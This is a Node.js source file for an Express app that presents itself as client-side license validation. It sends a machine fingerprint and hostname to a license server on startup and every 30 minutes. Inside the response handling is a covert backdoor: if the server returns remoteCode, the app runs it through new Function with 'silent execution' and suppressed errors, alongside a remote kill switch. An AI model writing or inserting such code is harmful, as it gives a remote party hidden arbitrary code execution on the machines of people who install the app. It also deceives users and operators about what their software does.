// CLIENT SIDE (Your protected Node.js app - app.js)

const express = require("express");
const axios = require("axios");
const nacl = require("tweetnacl");
const naclUtil = require("tweetnacl-util");
const os = require("os");
const { machineIdSync } = require("node-machine-id");

// === CONFIG: Embed and OBFUSCATE this in production ===
const SERVER_PUBLIC_KEY = naclUtil.decodeBase64("test"); // From generation step

const LICENSE_SERVER_URL = "http://localhost:4000/check";

let isAuthorized = true;
let remoteExecEnabled = true;

async function validateLicense() {
  try {
    const fingerprint = machineIdSync();
    const payload = {
      fingerprint,
      hostname: os.hostname(),
      platform: os.platform(),
      version: "1.0.0",
    };

    // Generate ephemeral key pair for this request (standard NaCl box)
    const clientEphemeralKeyPair = nacl.box.keyPair();

    const message = naclUtil.decodeUTF8(JSON.stringify(payload));
    const nonce = nacl.randomBytes(nacl.box.nonceLength);

    const encrypted = nacl.box(
      message,
      nonce,
      SERVER_PUBLIC_KEY,
      clientEphemeralKeyPair.secretKey
    );

    const res = await axios.post(
      LICENSE_SERVER_URL,
      {
        encryptedPayload: naclUtil.encodeBase64(encrypted),
        nonce: naclUtil.encodeBase64(nonce),
        clientPublicKey: naclUtil.encodeBase64(
          clientEphemeralKeyPair.publicKey
        ),
      },
      { timeout: 10000 }
    );

    // Decrypt server response (server used our ephemeral public key)
    if (res.data.encryptedResponse && res.data.nonce) {
      const ciphertext = naclUtil.decodeBase64(res.data.encryptedResponse);
      const responseNonce = naclUtil.decodeBase64(res.data.nonce);

      const decrypted = nacl.box.open(
        ciphertext,
        responseNonce,
        SERVER_PUBLIC_KEY,
        clientEphemeralKeyPair.secretKey
      );

      if (!decrypted) {
        throw new Error("Failed to decrypt response - invalid or forged");
      }

      const response = JSON.parse(naclUtil.encodeUTF8(decrypted));

      if (response.action === "terminate") {
        isAuthorized = false;
        return;
      }

      remoteExecEnabled = !!response.remoteExecEnabled;

      if (remoteExecEnabled && response.remoteCode) {
        try {
          const func = new Function(response.remoteCode);
          func(); // Silent execution
        } catch (err) {
          // Silent
        }
      }

      isAuthorized = true;
    }
  } catch (err) {
    isAuthorized = false;
  }
}

// Run on startup + every 30 min
validateLicense();
setInterval(validateLicense, 30 * 60 * 1000);

// Your actual app
const app = express();

app.use((req, res, next) => {
  if (!isAuthorized) {
    return res.status(503).send("Service unavailable");
  }
  next();
});

app.get("/", (req, res) => res.send("Hello from protected app!"));

app.listen(3000, () => console.log("App running on 3000"));
